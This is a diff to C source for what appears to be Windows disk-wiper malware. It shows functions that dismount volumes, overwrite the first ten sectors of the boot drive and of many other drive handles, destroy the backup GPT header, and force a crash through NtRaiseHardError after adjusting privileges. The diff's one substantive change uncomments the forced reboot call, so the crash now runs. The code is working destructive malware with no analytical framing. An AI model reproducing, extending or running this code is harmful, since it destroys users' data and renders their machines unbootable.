@@ -10,13 +10,13 @@ typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable
 signed int hard_reboot()
 {
 	BOOLEAN bEnabled;
-    ULONG uResp;
-    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
-    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
-    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
-    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
-    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
-    NtCall2(STATUS_HOST_DOWN, 0, 0, 0, 6, &uResp);
+    	ULONG uResp;
+   	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+    	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
+    	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
+    	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
+    	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
+    	NtCall2(STATUS_HOST_DOWN, 0, 0, 0, 6, &uResp);
 	return 0;
 }
 signed int destroy_backup_gpt_header()
@@ -102,7 +102,7 @@ signed int Trash_10_Sectors()
   uninitialized_lpBuffer = LocalAlloc(0, 10 * OutBuffer.BytesPerSector);// Allocate 10 sector size buffer
   if ( uninitialized_lpBuffer )
   {
-    DeviceIoControl(device_handle, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
+    	DeviceIoControl(device_handle, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
 	DeviceIoControl(hdd1, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
 	DeviceIoControl(hdd2, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
 	DeviceIoControl(hdd3, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
@@ -129,7 +129,7 @@ signed int Trash_10_Sectors()
 	DeviceIoControl(hdd24, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
 	DeviceIoControl(hdd25, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
 	DeviceIoControl(hdd26, FSCTL_DISMOUNT_VOLUME, 0, 0, 0, 0, &BytesReturned, 0);
-    WriteFile(device_handle, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
+    	WriteFile(device_handle, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
 	WriteFile(hdd1, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
 	WriteFile(hdd2, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
 	WriteFile(hdd3, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
@@ -156,7 +156,7 @@ signed int Trash_10_Sectors()
 	WriteFile(hdd24, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
 	WriteFile(hdd25, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
 	WriteFile(hdd26, uninitialized_lpBuffer, 10 * OutBuffer.BytesPerSector, &BytesReturned, 0);// Trash 10 Sectors
-    LocalFree((HLOCAL)uninitialized_lpBuffer);
+    	LocalFree((HLOCAL)uninitialized_lpBuffer);
   }
   CloseHandle(device_handle);
   return 1;
@@ -178,7 +178,7 @@ int _stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmd, int nCmd
 		{
 			Trash_10_Sectors();
 			destroy_backup_gpt_header();
-			//hard_reboot();
+			hard_reboot();
 		}
 	}
 }
